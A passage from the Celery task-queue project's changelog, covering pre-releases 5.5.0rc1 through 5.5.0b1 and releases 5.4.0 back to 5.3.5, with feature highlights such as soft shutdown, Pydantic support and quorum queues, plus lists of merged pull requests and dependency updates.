The `REMAP_SIGTERM` \"hidden feature\" has been tested, `documented <worker-REMAP_SIGTERM>`{.interpreted-text role="ref"} and is now officially supported. This feature allows users to remap the SIGTERM signal to SIGQUIT, to initiate a soft or a cold shutdown using `TERM`{.interpreted-text role="sig"} instead of `QUIT`{.interpreted-text role="sig"}.

#### Pydantic Support

This release introduces support for Pydantic models in Celery tasks. For more info, see the new pydantic example and PR [\#9023](https://github.com/celery/celery/pull/9023) by \@mathiasertl.

After upgrading to this version, please share your feedback on the new Pydantic support.

#### Redis Broker Stability Improvements

The root cause of the Redis broker instability issue has been [identified and resolved](https://github.com/celery/kombu/pull/2007) in the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.

After upgrading to this version, please share your feedback on the Redis broker stability.

Relevant Issues: [\#7276](https://github.com/celery/celery/discussions/7276), [\#8091](https://github.com/celery/celery/discussions/8091), [\#8030](https://github.com/celery/celery/discussions/8030), [\#8384](https://github.com/celery/celery/discussions/8384)

#### Quorum Queues Initial Support

This release introduces the initial support for Quorum Queues with Celery.

See new configuration options for more details:

-   `task_default_queue_type`{.interpreted-text role="setting"}
-   `worker_detect_quorum_queues`{.interpreted-text role="setting"}

After upgrading to this version, please share your feedback on the Quorum Queues support.

Relevant Issues: [\#6067](https://github.com/celery/celery/discussions/6067), [\#9121](https://github.com/celery/celery/discussions/9121)

### What\'s Changed

-   Added Blacksmith.sh to the Sponsors section in the README (\#9323)
-   Revert \"Added Blacksmith.sh to the Sponsors section in the README\" (\#9324)
-   Added Blacksmith.sh to the Sponsors section in the README (\#9325)
-   Added missing \" " in README (\#9326)
-   Use Blacksmith SVG logo (\#9327)
-   Updated Blacksmith SVG logo (\#9328)
-   Revert \"Updated Blacksmith SVG logo\" (\#9329)
-   Update pymongo to 4.10.0 (\#9330)
-   Update pymongo to 4.10.1 (\#9332)
-   Update user guide to recommend delay\_on\_commit (\#9333)
-   Pin pre-commit to latest version 4.0.0 (Python 3.9+) (\#9334)
-   Update ephem to 4.1.6 (\#9336)
-   Updated Blacksmith SVG logo (\#9337)
-   Prepare for (pre) release: v5.5.0rc1 (\#9341)

5.5.0b4 {#version-5.5.0b4}
-------

release-date

:   2024-09-30

release-by

:   Tomer Nosrati

Celery v5.5.0 Beta 4 is now available for testing. Please help us test this version and report any issues.

### Key Highlights

#### Python 3.13 Initial Support

This release introduces the initial support for Python 3.13 with Celery.

After upgrading to this version, please share your feedback on the Python 3.13 support.

### Previous Pre-release Highlights

#### Soft Shutdown

The soft shutdown is a new mechanism in Celery that sits between the warm shutdown and the cold shutdown. It sets a time limited \"warm shutdown\" period, during which the worker will continue to process tasks that are already running. After the soft shutdown ends, the worker will initiate a graceful cold shutdown, stopping all tasks and exiting.

The soft shutdown is disabled by default, and can be enabled by setting the new configuration option `worker_soft_shutdown_timeout`{.interpreted-text role="setting"}. If a worker is not running any task when the soft shutdown initiates, it will skip the warm shutdown period and proceed directly to the cold shutdown unless the new configuration option `worker_enable_soft_shutdown_on_idle`{.interpreted-text role="setting"} is set to True. This is useful for workers that are idle, waiting on ETA tasks to be executed that still want to enable the soft shutdown anyways.

The soft shutdown can replace the cold shutdown when using a broker with a visibility timeout mechanism, like `Redis <broker-redis>`{.interpreted-text role="ref"} or `SQS <broker-sqs>`{.interpreted-text role="ref"}, to enable a more graceful cold shutdown procedure, allowing the worker enough time to re-queue tasks that were not completed (e.g., `Restoring 1 unacknowledged message(s)`) by resetting the visibility timeout of the unacknowledged messages just before the worker exits completely.

After upgrading to this version, please share your feedback on the new Soft Shutdown mechanism.

Relevant Issues: [\#9213](https://github.com/celery/celery/pull/9213), [\#9231](https://github.com/celery/celery/pull/9231), [\#9238](https://github.com/celery/celery/pull/9238)

-   New `documentation <worker-stopping>`{.interpreted-text role="ref"} for each shutdown type.
-   New `worker_soft_shutdown_timeout`{.interpreted-text role="setting"} configuration option.
-   New `worker_enable_soft_shutdown_on_idle`{.interpreted-text role="setting"} configuration option.

#### REMAP\_SIGTERM

The `REMAP_SIGTERM` \"hidden feature\" has been tested, `documented <worker-REMAP_SIGTERM>`{.interpreted-text role="ref"} and is now officially supported. This feature allows users to remap the SIGTERM signal to SIGQUIT, to initiate a soft or a cold shutdown using `TERM`{.interpreted-text role="sig"} instead of `QUIT`{.interpreted-text role="sig"}.

#### Pydantic Support

This release introduces support for Pydantic models in Celery tasks. For more info, see the new pydantic example and PR [\#9023](https://github.com/celery/celery/pull/9023) by \@mathiasertl.

After upgrading to this version, please share your feedback on the new Pydantic support.

#### Redis Broker Stability Improvements

The root cause of the Redis broker instability issue has been [identified and resolved](https://github.com/celery/kombu/pull/2007) in the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.

After upgrading to this version, please share your feedback on the Redis broker stability.

Relevant Issues: [\#7276](https://github.com/celery/celery/discussions/7276), [\#8091](https://github.com/celery/celery/discussions/8091), [\#8030](https://github.com/celery/celery/discussions/8030), [\#8384](https://github.com/celery/celery/discussions/8384)

#### Quorum Queues Initial Support

This release introduces the initial support for Quorum Queues with Celery.

See new configuration options for more details:

-   `task_default_queue_type`{.interpreted-text role="setting"}
-   `worker_detect_quorum_queues`{.interpreted-text role="setting"}

After upgrading to this version, please share your feedback on the Quorum Queues support.

Relevant Issues: [\#6067](https://github.com/celery/celery/discussions/6067), [\#9121](https://github.com/celery/celery/discussions/9121)

### What\'s Changed

-   Correct the error description in exception message when validate soft\_time\_limit (\#9246)
-   Update msgpack to 1.1.0 (\#9249)
-   chore(utils/time.py): rename [\_is\_ambigious]{.title-ref} -\> [\_is\_ambiguous]{.title-ref} (\#9248)
-   Reduced Smoke Tests to min/max supported python (3.8/3.12) (\#9252)
-   Update pytest to 8.3.3 (\#9253)
-   Update elasticsearch requirement from \<=8.15.0 to \<=8.15.1 (\#9255)
-   Update mongodb without deprecated [\[srv\]]{.title-ref} extra requirement (\#9258)
-   blacksmith.sh: Migrate workflows to Blacksmith (\#9261)
-   Fixes \#9119: inject dispatch\_uid for retry-wrapped receivers (\#9247)
-   Run all smoke tests CI jobs together (\#9263)
-   Improve documentation on visibility timeout (\#9264)
-   Bump pytest-celery to 1.1.2 (\#9267)
-   Added missing \"app.conf.visibility\_timeout\" in smoke tests (\#9266)
-   Improved stability with t/smoke/tests/test\_consumer.py (\#9268)
-   Improved Redis container stability in the smoke tests (\#9271)
-   Disabled EXHAUST\_MEMORY tests in Smoke-tasks (\#9272)
-   Marked xfail for test\_reducing\_prefetch\_count with Redis - flaky test (\#9273)
-   Fixed pypy unit tests random failures in the CI (\#9275)
-   Fixed more pypy unit tests random failures in the CI (\#9278)
-   Fix Redis container from aborting randomly (\#9276)
-   Run Integration & Smoke CI tests together after unit tests pass (\#9280)
-   Added \"loglevel verbose\" to Redis containers in smoke tests (\#9282)
-   Fixed Redis error in the smoke tests: \"Possible SECURITY ATTACK detected\" (\#9284)
-   Refactored the smoke tests github workflow (\#9285)
-   Increased \--reruns 3-\>4 in smoke tests (\#9286)
-   Improve stability of smoke tests (CI and Local) (\#9287)
-   Fixed Smoke tests CI \"test-case\" labels (specific instead of general) (\#9288)
-   Use assert\_log\_exists instead of wait\_for\_log in worker smoke tests (\#9290)
-   Optimized t/smoke/tests/test\_worker.py (\#9291)
-   Enable smoke tests dockers check before each test starts (\#9292)
-   Relaxed smoke tests flaky tests mechanism (\#9293)
-   Updated quorum queue detection to handle multiple broker instances (\#9294)
-   Non-lazy table creation for database backend (\#9228)
-   Pin pymongo to latest version 4.9 (\#9297)
-   Bump pymongo from 4.9 to 4.9.1 (\#9298)
-   Bump Kombu to v5.4.2 (\#9304)
-   Use rabbitmq:3 in stamping smoke tests (\#9307)
-   Bump pytest-celery to 1.1.3 (\#9308)
-   Added Python 3.13 Support (\#9309)
-   Add log when global qos is disabled (\#9296)
-   Added official release docs (whatsnew) for v5.5 (\#9312)
-   Enable Codespell autofix (\#9313)
-   Pydantic typehints: Fix optional, allow generics (\#9319)
-   Prepare for (pre) release: v5.5.0b4 (\#9322)

5.5.0b3 {#version-5.5.0b3}
-------

release-date

:   2024-09-08

release-by

:   Tomer Nosrati

Celery v5.5.0 Beta 3 is now available for testing. Please help us test this version and report any issues.

### Key Highlights

#### Soft Shutdown

The soft shutdown is a new mechanism in Celery that sits between the warm shutdown and the cold shutdown. It sets a time limited \"warm shutdown\" period, during which the worker will continue to process tasks that are already running. After the soft shutdown ends, the worker will initiate a graceful cold shutdown, stopping all tasks and exiting.

The soft shutdown is disabled by default, and can be enabled by setting the new configuration option `worker_soft_shutdown_timeout`{.interpreted-text role="setting"}. If a worker is not running any task when the soft shutdown initiates, it will skip the warm shutdown period and proceed directly to the cold shutdown unless the new configuration option `worker_enable_soft_shutdown_on_idle`{.interpreted-text role="setting"} is set to True. This is useful for workers that are idle, waiting on ETA tasks to be executed that still want to enable the soft shutdown anyways.

The soft shutdown can replace the cold shutdown when using a broker with a visibility timeout mechanism, like `Redis <broker-redis>`{.interpreted-text role="ref"} or `SQS <broker-sqs>`{.interpreted-text role="ref"}, to enable a more graceful cold shutdown procedure, allowing the worker enough time to re-queue tasks that were not completed (e.g., `Restoring 1 unacknowledged message(s)`) by resetting the visibility timeout of the unacknowledged messages just before the worker exits completely.

After upgrading to this version, please share your feedback on the new Soft Shutdown mechanism.

Relevant Issues: [\#9213](https://github.com/celery/celery/pull/9213), [\#9231](https://github.com/celery/celery/pull/9231), [\#9238](https://github.com/celery/celery/pull/9238)

-   New `documentation <worker-stopping>`{.interpreted-text role="ref"} for each shutdown type.
-   New `worker_soft_shutdown_timeout`{.interpreted-text role="setting"} configuration option.
-   New `worker_enable_soft_shutdown_on_idle`{.interpreted-text role="setting"} configuration option.

#### REMAP\_SIGTERM

The `REMAP_SIGTERM` \"hidden feature\" has been tested, `documented <worker-REMAP_SIGTERM>`{.interpreted-text role="ref"} and is now officially supported. This feature allows users to remap the SIGTERM signal to SIGQUIT, to initiate a soft or a cold shutdown using `TERM`{.interpreted-text role="sig"} instead of `QUIT`{.interpreted-text role="sig"}.

### Previous Pre-release Highlights

#### Pydantic Support

This release introduces support for Pydantic models in Celery tasks. For more info, see the new pydantic example and PR [\#9023](https://github.com/celery/celery/pull/9023) by \@mathiasertl.

After upgrading to this version, please share your feedback on the new Pydantic support.

#### Redis Broker Stability Improvements

The root cause of the Redis broker instability issue has been [identified and resolved](https://github.com/celery/kombu/pull/2007) in the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.

After upgrading to this version, please share your feedback on the Redis broker stability.

Relevant Issues: [\#7276](https://github.com/celery/celery/discussions/7276), [\#8091](https://github.com/celery/celery/discussions/8091), [\#8030](https://github.com/celery/celery/discussions/8030), [\#8384](https://github.com/celery/celery/discussions/8384)

#### Quorum Queues Initial Support

This release introduces the initial support for Quorum Queues with Celery.

See new configuration options for more details:

-   `task_default_queue_type`{.interpreted-text role="setting"}
-   `worker_detect_quorum_queues`{.interpreted-text role="setting"}

After upgrading to this version, please share your feedback on the Quorum Queues support.

Relevant Issues: [\#6067](https://github.com/celery/celery/discussions/6067), [\#9121](https://github.com/celery/celery/discussions/9121)

### What\'s Changed

-   Added SQS (localstack) broker to canvas smoke tests (\#9179)
-   Pin elastic-transport to \<= latest version 8.15.0 (\#9182)
-   Update elasticsearch requirement from \<=8.14.0 to \<=8.15.0 (\#9186)
-   Improve formatting (\#9188)
-   Add basic helm chart for celery (\#9181)
-   Update kafka.rst (\#9194)
-   Update pytest-order to 1.3.0 (\#9198)
-   Update mypy to 1.11.2 (\#9206)
-   All added to routes (\#9204)
-   Fix typos discovered by codespell (\#9212)
-   Use tzdata extras with zoneinfo backports (\#8286)
-   Use [docker compose]{.title-ref} in Contributing\'s doc build section (\#9219)
-   Failing test for issue \#9119 (\#9215)
-   Fix date\_done timezone issue (\#8385)
-   CI Fixes to smoke tests (\#9223)
-   Fix: passes current request context when pushing to request\_stack (\#9208)
-   Fix broken link in the Using RabbitMQ docs page (\#9226)
-   Added Soft Shutdown Mechanism (\#9213)
-   Added worker\_enable\_soft\_shutdown\_on\_idle (\#9231)
-   Bump cryptography from 43.0.0 to 43.0.1 (\#9233)
-   Added docs regarding the relevancy of soft shutdown and ETA tasks (\#9238)
-   Show broker\_connection\_retry\_on\_startup warning only if it evaluates as False (\#9227)
-   Fixed docker-docs CI failure (\#9240)
-   Added docker cleanup auto-fixture to improve smoke tests stability (\#9243)
-   print is not thread-safe, so should not be used in signal handler (\#9222)
-   Prepare for (pre) release: v5.5.0b3 (\#9244)

5.5.0b2 {#version-5.5.0b2}
-------

release-date

:   2024-08-06

release-by

:   Tomer Nosrati

Celery v5.5.0 Beta 2 is now available for testing. Please help us test this version and report any issues.

### Key Highlights

#### Pydantic Support

This release introduces support for Pydantic models in Celery tasks. For more info, see the new pydantic example and PR [\#9023](https://github.com/celery/celery/pull/9023) by \@mathiasertl.

After upgrading to this version, please share your feedback on the new Pydantic support.

### Previous Beta Highlights

#### Redis Broker Stability Improvements

The root cause of the Redis broker instability issue has been [identified and resolved](https://github.com/celery/kombu/pull/2007) in the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.

After upgrading to this version, please share your feedback on the Redis broker stability.

Relevant Issues: [\#7276](https://github.com/celery/celery/discussions/7276), [\#8091](https://github.com/celery/celery/discussions/8091), [\#8030](https://github.com/celery/celery/discussions/8030), [\#8384](https://github.com/celery/celery/discussions/8384)

#### Quorum Queues Initial Support

This release introduces the initial support for Quorum Queues with Celery.

See new configuration options for more details:

-   `task_default_queue_type`{.interpreted-text role="setting"}
-   `worker_detect_quorum_queues`{.interpreted-text role="setting"}

After upgrading to this version, please share your feedback on the Quorum Queues support.

Relevant Issues: [\#6067](https://github.com/celery/celery/discussions/6067), [\#9121](https://github.com/celery/celery/discussions/9121)

### What\'s Changed

-   Bump pytest from 8.3.1 to 8.3.2 (\#9153)
-   Remove setuptools deprecated test command from setup.py (\#9159)
-   Pin pre-commit to latest version 3.8.0 from Python 3.9 (\#9156)
-   Bump mypy from 1.11.0 to 1.11.1 (\#9164)
-   Change \"docker-compose\" to \"docker compose\" in Makefile (\#9169)
-   update python versions and docker compose (\#9171)
-   Add support for Pydantic model validation/serialization (fixes \#8751) (\#9023)
-   Allow local dynamodb to be installed on another host than localhost (\#8965)
-   Terminate job implementation for gevent concurrency backend (\#9083)
-   Bump Kombu to v5.4.0 (\#9177)
-   Add check for soft\_time\_limit and time\_limit values (\#9173)
-   Prepare for (pre) release: v5.5.0b2 (\#9178)

5.5.0b1 {#version-5.5.0b1}
-------

release-date

:   2024-07-24

release-by

:   Tomer Nosrati

Celery v5.5.0 Beta 1 is now available for testing. Please help us test this version and report any issues.

### Key Highlights

#### Redis Broker Stability Improvements

The root cause of the Redis broker instability issue has been [identified and resolved](https://github.com/celery/kombu/pull/2007) in the release-candidate for Kombu v5.4.0. This beta release has been upgraded to use the new Kombu RC version, which should resolve the disconnections bug and offer additional improvements.

After upgrading to this version, please share your feedback on the Redis broker stability.

Relevant Issues: [\#7276](https://github.com/celery/celery/discussions/7276), [\#8091](https://github.com/celery/celery/discussions/8091), [\#8030](https://github.com/celery/celery/discussions/8030), [\#8384](https://github.com/celery/celery/discussions/8384)

#### Quorum Queues Initial Support

This release introduces the initial support for Quorum Queues with Celery.

See new configuration options for more details:

-   `task_default_queue_type`{.interpreted-text role="setting"}
-   `worker_detect_quorum_queues`{.interpreted-text role="setting"}

After upgrading to this version, please share your feedback on the Quorum Queues support.

Relevant Issues: [\#6067](https://github.com/celery/celery/discussions/6067), [\#9121](https://github.com/celery/celery/discussions/9121)

### What\'s Changed

-   (docs): use correct version celery v.5.4.x (\#8975)
-   Update mypy to 1.10.0 (\#8977)
-   Limit pymongo\<4.7 when Python \<= 3.10 due to breaking changes in 4.7 (\#8988)
-   Bump pytest from 8.1.1 to 8.2.0 (\#8987)
-   Update README to Include FastAPI in Framework Integration Section (\#8978)
-   Clarify return values of \...\_on\_commit methods (\#8984)
-   add kafka broker docs (\#8935)
-   Limit pymongo\<4.7 regardless of Python version (\#8999)
-   Update pymongo\[srv\] requirement from \<4.7,\>=4.0.2 to \>=4.0.2,\<4.8 (\#9000)
-   Update elasticsearch requirement from \<=8.13.0 to \<=8.13.1 (\#9004)
-   security: SecureSerializer: support generic low-level serializers (\#8982)
-   don\'t kill if pid same as file (\#8997) (\#8998)
-   Update cryptography to 42.0.6 (\#9005)
-   Bump cryptography from 42.0.6 to 42.0.7 (\#9009)
-   Added -vv to unit, integration and smoke tests (\#9014)
-   SecuritySerializer: ensure pack separator will not be conflicted with serialized fields (\#9010)
-   Update sphinx-click to 5.2.2 (\#9025)
-   Bump sphinx-click from 5.2.2 to 6.0.0 (\#9029)
-   Fix a typo to display the help message in first-steps-with-django (\#9036)
-   Pinned requests to v2.31.0 due to docker-py bug \#3256 (\#9039)
-   Fix certificate validity check (\#9037)
-   Revert \"Pinned requests to v2.31.0 due to docker-py bug \#3256\" (\#9043)
-   Bump pytest from 8.2.0 to 8.2.1 (\#9035)
-   Update elasticsearch requirement from \<=8.13.1 to \<=8.13.2 (\#9045)
-   Fix detection of custom task set as class attribute with Django (\#9038)
-   Update elastic-transport requirement from \<=8.13.0 to \<=8.13.1 (\#9050)
-   Bump pycouchdb from 1.14.2 to 1.16.0 (\#9052)
-   Update pytest to 8.2.2 (\#9060)
-   Bump cryptography from 42.0.7 to 42.0.8 (\#9061)
-   Update elasticsearch requirement from \<=8.13.2 to \<=8.14.0 (\#9069)
-   \[enhance feature\] Crontab schedule: allow using month names (\#9068)
-   Enhance tox environment: \[testenv:clean\] (\#9072)
-   Clarify docs about Reserve one task at a time (\#9073)
-   GCS docs fixes (\#9075)
-   Use hub.remove\_writer instead of hub.remove for write fds (\#4185) (\#9055)
-   Class method to process crontab string (\#9079)
-   Fixed smoke tests env bug when using integration tasks that rely on Redis (\#9090)
-   Bugfix - a task will run multiple times when chaining chains with groups (\#9021)
-   Bump mypy from 1.10.0 to 1.10.1 (\#9096)
-   Don\'t add a separator to global\_keyprefix if it already has one (\#9080)
-   Update pymongo\[srv\] requirement from \<4.8,\>=4.0.2 to \>=4.0.2,\<4.9 (\#9111)
-   Added missing import in examples for Django (\#9099)
-   Bump Kombu to v5.4.0rc1 (\#9117)
-   Removed skipping Redis in t/smoke/tests/test\_consumer.py tests (\#9118)
-   Update pytest-subtests to 0.13.0 (\#9120)
-   Increased smoke tests CI timeout (\#9122)
-   Bump Kombu to v5.4.0rc2 (\#9127)
-   Update zstandard to 0.23.0 (\#9129)
-   Update pytest-subtests to 0.13.1 (\#9130)
-   Changed retry to tenacity in smoke tests (\#9133)
-   Bump mypy from 1.10.1 to 1.11.0 (\#9135)
-   Update cryptography to 43.0.0 (\#9138)
-   Update pytest to 8.3.1 (\#9137)
-   Added support for Quorum Queues (\#9121)
-   Bump Kombu to v5.4.0rc3 (\#9139)
-   Cleanup in Changelog.rst (\#9141)
-   Update Django docs for CELERY\_CACHE\_BACKEND (\#9143)
-   Added missing docs to previous releases (\#9144)
-   Fixed a few documentation build warnings (\#9145)
-   docs(README): link invalid (\#9148)
-   Prepare for (pre) release: v5.5.0b1 (\#9146)

5.4.0 {#version-5.4.0}
-----

release-date

:   2024-04-17

release-by

:   Tomer Nosrati

Celery v5.4.0 and v5.3.x have consistently focused on enhancing the overall QA, both internally and externally. This effort led to the new pytest-celery v1.0.0 release, developed concurrently with v5.3.0 & v5.4.0.

This release introduces two significant QA enhancements:

-   **Smoke Tests**: A new layer of automatic tests has been added to Celery\'s standard CI. These tests are designed to handle production scenarios and complex conditions efficiently. While new contributions will not be halted due to the lack of smoke tests, we will request smoke tests for advanced changes where appropriate.
-   [Standalone Bug Report Script](https://docs.celeryq.dev/projects/pytest-celery/en/latest/userguide/celery-bug-report.html): The new pytest-celery plugin now allows for encapsulating a complete Celery dockerized setup within a single pytest script. Incorporating these into new bug reports will enable us to reproduce reported bugs deterministically, potentially speeding up the resolution process.

Contrary to the positive developments above, there have been numerous reports about issues with the Redis broker malfunctioning upon restarts and disconnections. Our initial attempts to resolve this were not successful (\#8796). With our enhanced QA capabilities, we are now prepared to address the core issue with Redis (as a broker) again.

The rest of the changes for this release are grouped below, with the changes from the latest release candidate listed at the end.

### Changes

-   Add a Task class specialised for Django (\#8491)
-   Add Google Cloud Storage (GCS) backend (\#8868)
-   Added documentation to the smoke tests infra (\#8970)
-   Added a checklist item for using pytest-celery in a bug report (\#8971)
-   Bugfix: Missing id on chain (\#8798)
-   Bugfix: Worker not consuming tasks after Redis broker restart (\#8796)
-   Catch UnicodeDecodeError when opening corrupt beat-schedule.db (\#8806)
-   chore(ci): Enhance CI with [workflow\_dispatch]{.title-ref} for targeted debugging and testing (\#8826)
-   Doc: Enhance \"Testing with Celery\" section (\#8955)
-   Docfix: pip install celery\[sqs\] -\> pip install \"celery\[sqs\]\" (\#8829)
-   Enable efficient [chord]{.title-ref} when using dynamicdb as backend store (\#8783)
-   feat(daemon): allows daemonization options to be fetched from app settings (\#8553)
-   Fix DeprecationWarning: datetime.datetime.utcnow() (\#8726)
-   Fix recursive result parents on group in middle of chain (\#8903)
-   Fix typos and grammar (\#8915)
-   Fixed version documentation tag from \#8553 in configuration.rst (\#8802)
-   Hotfix: Smoke tests didn\'t allow customizing the worker\'s command arguments, now it does (\#8937)
-   Make custom remote control commands available in CLI (\#8489)
-   Print safe\_say() to stdout for non-error flows (\#8919)
-   Support moto 5.0 (\#8838)
-   Update contributing guide to use ssh upstream url (\#8881)
-   Update optimizing.rst (\#8945)
-   Updated concurrency docs page. (\#8753)

### Dependencies Updates

-   Bump actions/setup-python from 4 to 5 (\#8701)
-   Bump codecov/codecov-action from 3 to 4 (\#8831)
-   Bump isort from 5.12.0 to 5.13.2 (\#8772)
-   Bump msgpack from 1.0.7 to 1.0.8 (\#8885)
-   Bump mypy from 1.8.0 to 1.9.0 (\#8898)
-   Bump pre-commit to 3.6.1 (\#8839)
-   Bump pre-commit/action from 3.0.0 to 3.0.1 (\#8835)
-   Bump pytest from 8.0.2 to 8.1.1 (\#8901)
-   Bump pytest-celery to v1.0.0 (\#8962)
-   Bump pytest-cov to 5.0.0 (\#8924)
-   Bump pytest-order from 1.2.0 to 1.2.1 (\#8941)
-   Bump pytest-subtests from 0.11.0 to 0.12.1 (\#8896)
-   Bump pytest-timeout from 2.2.0 to 2.3.1 (\#8894)
-   Bump python-memcached from 1.59 to 1.61 (\#8776)
-   Bump sphinx-click from 4.4.0 to 5.1.0 (\#8774)
-   Update cryptography to 42.0.5 (\#8869)
-   Update elastic-transport requirement from \<=8.12.0 to \<=8.13.0 (\#8933)
-   Update elasticsearch requirement from \<=8.12.1 to \<=8.13.0 (\#8934)
-   Upgraded Sphinx from v5.3.0 to v7.x.x (\#8803)

### Changes since 5.4.0rc2

-   Update elastic-transport requirement from \<=8.12.0 to \<=8.13.0 (\#8933)
-   Update elasticsearch requirement from \<=8.12.1 to \<=8.13.0 (\#8934)
-   Hotfix: Smoke tests didn\'t allow customizing the worker\'s command arguments, now it does (\#8937)
-   Bump pytest-celery to 1.0.0rc3 (\#8946)
-   Update optimizing.rst (\#8945)
-   Doc: Enhance \"Testing with Celery\" section (\#8955)
-   Bump pytest-celery to v1.0.0 (\#8962)
-   Bump pytest-order from 1.2.0 to 1.2.1 (\#8941)
-   Added documentation to the smoke tests infra (\#8970)
-   Added a checklist item for using pytest-celery in a bug report (\#8971)
-   Added changelog for v5.4.0 (\#8973)
-   Bump version: 5.4.0rc2 → 5.4.0 (\#8974)

5.4.0rc2 {#version-5.4.0rc2}
--------

release-date

:   2024-03-27

release-by

:   Tomer Nosrati

-   feat(daemon): allows daemonization options to be fetched from app settings (\#8553)
-   Fixed version documentation tag from \#8553 in configuration.rst (\#8802)
-   Upgraded Sphinx from v5.3.0 to v7.x.x (\#8803)
-   Update elasticsearch requirement from \<=8.11.1 to \<=8.12.0 (\#8810)
-   Update elastic-transport requirement from \<=8.11.0 to \<=8.12.0 (\#8811)
-   Update cryptography to 42.0.0 (\#8814)
-   Catch UnicodeDecodeError when opening corrupt beat-schedule.db (\#8806)
-   Update cryptography to 42.0.1 (\#8817)
-   Limit moto to \<5.0.0 until the breaking issues are fixed (\#8820)
-   Enable efficient [chord]{.title-ref} when using dynamicdb as backend store (\#8783)
-   Add a Task class specialised for Django (\#8491)
-   Sync kombu versions in requirements and setup.cfg (\#8825)
-   chore(ci): Enhance CI with [workflow\_dispatch]{.title-ref} for targeted debugging and testing (\#8826)
-   Update cryptography to 42.0.2 (\#8827)
-   Docfix: pip install celery\[sqs\] -\> pip install \"celery\[sqs\]\" (\#8829)
-   Bump pre-commit/action from 3.0.0 to 3.0.1 (\#8835)
-   Support moto 5.0 (\#8838)
-   Another fix for [link\_error]{.title-ref} signatures being [dict\`s instead of \`Signature]{.title-ref} s (\#8841)
-   Bump codecov/codecov-action from 3 to 4 (\#8831)
-   Upgrade from pytest-celery v1.0.0b1 -\> v1.0.0b2 (\#8843)
-   Bump pytest from 7.4.4 to 8.0.0 (\#8823)
-   Update pre-commit to 3.6.1 (\#8839)
-   Update cryptography to 42.0.3 (\#8854)
-   Bump pytest from 8.0.0 to 8.0.1 (\#8855)
-   Update cryptography to 42.0.4 (\#8864)
-   Update pytest to 8.0.2 (\#8870)
-   Update cryptography to 42.0.5 (\#8869)
-   Update elasticsearch requirement from \<=8.12.0 to \<=8.12.1 (\#8867)
-   Eliminate consecutive chords generated by group \| task upgrade (\#8663)
-   Make custom remote control commands available in CLI (\#8489)
-   Add Google Cloud Storage (GCS) backend (\#8868)
-   Bump msgpack from 1.0.7 to 1.0.8 (\#8885)
-   Update pytest to 8.1.0 (\#8886)
-   Bump pytest-timeout from 2.2.0 to 2.3.1 (\#8894)
-   Bump pytest-subtests from 0.11.0 to 0.12.1 (\#8896)
-   Bump mypy from 1.8.0 to 1.9.0 (\#8898)
-   Update pytest to 8.1.1 (\#8901)
-   Update contributing guide to use ssh upstream url (\#8881)
-   Fix recursive result parents on group in middle of chain (\#8903)
-   Bump pytest-celery to 1.0.0b4 (\#8899)
-   Adjusted smoke tests CI time limit (\#8907)
-   Update pytest-rerunfailures to 14.0 (\#8910)
-   Use the \"all\" extra for pytest-celery (\#8911)
-   Fix typos and grammar (\#8915)
-   Bump pytest-celery to 1.0.0rc1 (\#8918)
-   Print safe\_say() to stdout for non-error flows (\#8919)
-   Update pytest-cov to 5.0.0 (\#8924)
-   Bump pytest-celery to 1.0.0rc2 (\#8928)

5.4.0rc1 {#version-5.4.0rc1}
--------

release-date

:   2024-01-17 7:00 P.M GMT+2

release-by

:   Tomer Nosrati

Celery v5.4 continues our effort to provide improved stability in production environments. The release candidate version is available for testing. The official release is planned for March-April 2024.

-   New Config: worker\_enable\_prefetch\_count\_reduction (\#8581)
-   Added \"Serverless\" section to Redis doc (redis.rst) (\#8640)
-   Upstash\'s Celery example repo link fix (\#8665)
-   Update mypy version (\#8679)
-   Update cryptography dependency to 41.0.7 (\#8690)
-   Add type annotations to celery/utils/nodenames.py (\#8667)
-   Issue 3426. Adding myself to the contributors. (\#8696)
-   Bump actions/setup-python from 4 to 5 (\#8701)
-   Fixed bug where chord.link\_error() throws an exception on a dict type errback object (\#8702)
-   Bump github/codeql-action from 2 to 3 (\#8725)
-   Fixed multiprocessing integration tests not running on Mac (\#8727)
-   Added make docker-docs (\#8729)
-   Fix DeprecationWarning: datetime.datetime.utcnow() (\#8726)
-   Remove [new]{.title-ref} adjective in docs (\#8743)
-   add type annotation to celery/utils/sysinfo.py (\#8747)
-   add type annotation to celery/utils/iso8601.py (\#8750)
-   Change type annotation to celery/utils/iso8601.py (\#8752)
-   Update test deps (\#8754)
-   Mark flaky: test\_asyncresult\_get\_cancels\_subscription() (\#8757)
-   change \_read\_as\_base64 (b64encode returns bytes) on celery/utils/term.py (\#8759)
-   Replace string concatenation with fstring on celery/utils/term.py (\#8760)
-   Add type annotation to celery/utils/term.py (\#8755)
-   Skipping test\_tasks::test\_task\_accepted (\#8761)
-   Updated concurrency docs page. (\#8753)
-   Changed pyup -\> dependabot for updating dependencies (\#8764)
-   Bump isort from 5.12.0 to 5.13.2 (\#8772)
-   Update elasticsearch requirement from \<=8.11.0 to \<=8.11.1 (\#8775)
-   Bump sphinx-click from 4.4.0 to 5.1.0 (\#8774)
-   Bump python-memcached from 1.59 to 1.61 (\#8776)
-   Update elastic-transport requirement from \<=8.10.0 to \<=8.11.0 (\#8780)
-   python-memcached==1.61 -\> python-memcached\>=1.61 (\#8787)
-   Remove usage of utcnow (\#8791)
-   Smoke Tests (\#8793)
-   Moved smoke tests to their own workflow (\#8797)
-   Bugfix: Worker not consuming tasks after Redis broker restart (\#8796)
-   Bugfix: Missing id on chain (\#8798)

5.3.6 {#version-5.3.6}
-----

release-date

:   2023-11-22 9:15 P.M GMT+6

release-by

:   Asif Saif Uddin

This release is focused mainly to fix AWS SQS new feature comatibility issue and old regressions. The code changes are mostly fix for regressions. More details can be found below.

-   Increased docker-build CI job timeout from 30m -\> 60m (\#8635)
-   Incredibly minor spelling fix. (\#8649)
-   Fix non-zero exit code when receiving remote shutdown (\#8650)
-   Update task.py get\_custom\_headers missing \'compression\' key (\#8633)
-   Update kombu\>=5.3.4 to fix SQS request compatibility with boto JSON serializer (\#8646)
-   test requirements version update (\#8655)
-   Update elasticsearch version (\#8656)
-   Propagates more ImportErrors during autodiscovery (\#8632)

5.3.5 {#version-5.3.5}
-----

release-date

:   2023-11-10 7:15 P.M GMT+6

release-by

:   Asif Saif Uddin

-   Update test.txt versions (\#8481)
-   fix os.getcwd() FileNotFoundError (\#8448)
-   Fix typo in CONTRIBUTING.rst (\#8494)
-   typo(doc): configuration.rst (\#8484)
-   assert before raise (\#8495)
